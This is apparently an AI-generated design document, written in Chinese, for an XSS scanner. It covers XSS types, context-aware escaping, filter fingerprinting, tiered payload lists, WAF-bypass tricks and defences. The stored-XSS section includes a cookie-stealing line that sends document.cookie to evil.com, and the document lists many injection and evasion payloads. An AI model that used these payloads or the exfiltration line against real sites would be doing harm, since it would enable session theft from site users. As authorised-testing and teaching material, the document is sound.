---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '9702f6f9-3a63-475a-9e13-251bf7637267'
  PropagateID: '9702f6f9-3a63-475a-9e13-251bf7637267'
  ReservedCode1: '77bd3488-d750-462c-a734-5d4200337d6f'
  ReservedCode2: '77bd3488-d750-462c-a734-5d4200337d6f'
---

# XSS 扫描工具 - 原理说明

## 概述

XSS（Cross-Site Scripting，跨站脚本）是一种将恶意 JavaScript 注入到网页中，当其他用户浏览该页面时恶意代码在其浏览器中执行的攻击。XSS 不攻击服务器本身，而是**攻击访问网页的用户**。

本工具采用**"先探测后精准打击"**的智能策略，而非传统扫描器的无脑全量遍历。

---

## XSS 类型

### 1. 反射型 XSS (Reflected XSS)

恶意脚本通过 URL 参数或表单提交，服务器未经净化直接"反射"回响应页面。

```
攻击流程:
攻击者构造链接 → http://target/search?q=<script>alert(1)</script>
受害者点击链接 → 服务器将参数值反射到页面 → 浏览器执行脚本 → 窃取Cookie/会话
```

**特点：** 非持久化，需要诱导用户点击。

### 2. 存储型 XSS (Stored XSS)

恶意脚本被存入数据库（如评论、留言板），任何访问该页面的用户都会触发。

```
攻击流程:
攻击者提交评论 → <script>fetch('http://evil.com?c='+document.cookie)</script>
服务器存储 → 每个用户浏览页面时 → 脚本自动执行 → 批量窃取会话
```

**特点：** 持久化，危害最大，一劳永逸。

### 3. DOM 型 XSS (DOM-based XSS)

漏洞在客户端 JavaScript 中，不经过服务器。DOM 操作直接将不可信数据插入页面。

```javascript
// 危险代码
document.getElementById('output').innerHTML = location.hash.slice(1);
// 攻击: http://target/page#<img src=x onerror=alert(1)>
```

**特点：** 服务端日志中看不到攻击痕迹，纯客户端漏洞。

---

## 工具设计思路：智能筛选 vs 无脑遍历

### 传统方式的问题

```
传统扫描器:
  200+ payload → 全部发送 → 并发量大 → 触发WAF → 被封IP → 效率低
```

### 本工具的策略

```
Step 1: 探针探测 → 确认参数是否可反射
Step 2: 上下文分析 → 判断注入点在HTML中的位置
Step 3: 过滤器指纹 → 探测哪些字符/关键词被过滤
Step 4: 精准选择 → 只发匹配上下文+绕过过滤的payload
```

**效果：** 从 200+ payload 缩减到 20-30 个精准 payload，并发量降低 80%+。

---

## 上下文感知 (Context-Aware)

XSS payload 的有效性完全取决于**注入点在 HTML 中的位置**。不同位置需要不同的逃逸策略：

| 上下文 | 示例 | 逃逸策略 |
|:-------|:-----|:---------|
| **HTML body** | `<div>用户输入在这里</div>` | 直接注入新标签 `<img src=x onerror=...>` |
| **双引号属性** | `<input value="用户输入">` | 逃逸引号 `" onerror=alert(1)` |
| **单引号属性** | `<input value='用户输入'>` | 逃逸引号 `' onerror=alert(1)` |
| **无引号属性** | `<input value=用户输入>` | 空格分隔 + 注入属性 ` onerror=alert(1)` |
| **script 内** | `<script>var x="用户输入"</script>` | 闭合 script `</script><img...>` |
| **HTML 注释** | `<!-- 用户输入 -->` | 逃逸注释 `--><script>...` |
| **URL 属性** | `<a href="用户输入">` | 注入 `javascript:alert(1)` |
| **style 内** | `<style>用户输入</style>` | 闭合 style `</style><script>...` |

**核心思想：** 在 body 中有效的 `<script>alert(1)</script>`，在属性内完全无效。先判断上下文，再选对应 payload，避免无效请求。

---

## 过滤器指纹 (Filter Fingerprinting)

在发送攻击 payload 之前，先用"探针"测试服务端的过滤行为：

```
探针:   xsstest<test    → 检测 < 是否被移除/编码
探针:   xsstest(test    → 检测 ( 是否被过滤
探针:   xsstestalert    → 检测 alert 关键词是否被拦截
```

**过滤行为分类：**
- **移除 (Remove)：** 字符直接消失 → 含该字符的 payload 全部跳过
- **编码 (Encode)：** `<` 变成 `&lt;` → payload 不会执行，跳过
- **拦截 (Block)：** WAF 返回 403/拦截页 → 调整策略或跳过
- **放行 (Pass)：** 字符原样出现 → 该字符可用，继续测试

---

## Payload 分级

基于 PortSwigger XSS Cheat Sheet 2026 和实战在野频率：

| 级别 | 说明 | 数量 | 何时使用 |
|:-----|:-----|:----:|:---------|
| **L0** | 高频核心 payload，在野出现频率最高 | ~20 | 默认必测 |
| **L1** | 绕过变种，常见过滤绕过（大小写/编码/分割等） | ~30 | L0 未命中时 |
| **L2** | Polyglot、mXSS、高级绕过 | ~25 | 深度测试时 |

---

## 在野高频 Payload 示例

### 无需交互触发（最佳）

```html
<!-- img onerror — 在野排名第一 -->
<img src=x onerror=alert(1)>

<!-- SVG onload -->
<svg onload=alert(1)>

<!-- details ontoggle -->
<details open ontoggle=alert(1)>

<!-- CSS animation (无需任何交互) -->
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>

<!-- input autofocus -->
<input autofocus onfocus=alert(1)>

<!-- video/audio source onerror -->
<video><source onerror=alert(1)>
```

### Polyglot（跨上下文万能 payload）

```html
<!-- 同时在标签和属性上下文中生效 -->
jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//
<svg/onload=alert(1)>

<!-- 逃逸属性的万能 payload -->
" autofocus onfocus="alert(1)" x="
```

### WAF 绕过技巧

| 技巧 | 示例 |
|:-----|:-----|
| 大小写混合 | `<ScRiPt>alert(1)</ScRiPt>` |
| 无空格 | `<img/src=x/onerror=alert(1)>` |
| 编码绕过 | `onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)` |
| 反引号 | `onerror=alert\`1\`` |
| 字符串拼接 | `window["al"+"ert"](1)` |
| Base64 | `eval(atob("YWxlcnQoMSk="))` |
| 换行/Tab | `<img\nsrc=x\nonerror=alert(1)>` |
| 注释分割 | `<img src=x on<!----error=alert(1)>` |
| 构造函数 | `[].constructor.constructor("alert(1)")()` |

---

## 防御建议

| 措施 | 说明 |
|:-----|:-----|
| **输出编码** | 根据上下文使用 HTML 实体编码 / JavaScript 编码 / URL 编码 |
| **CSP 策略** | Content-Security-Policy 限制脚本来源，禁止 inline script |
| **HttpOnly Cookie** | 防止 JS 读取敏感 Cookie |
| **输入验证** | 白名单校验输入格式、长度 |
| **框架自动转义** | React/Vue/Angular 默认转义，避免使用 `dangerouslySetInnerHTML` / `v-html` |
| **Sanitize 库** | 使用 DOMPurify 等库净化 HTML |

---

## 免责声明

本工具仅供安全研究与授权渗透测试使用。未经目标所有者明确授权，使用本工具对任何系统进行扫描或攻击均属违法行为。

> AI生成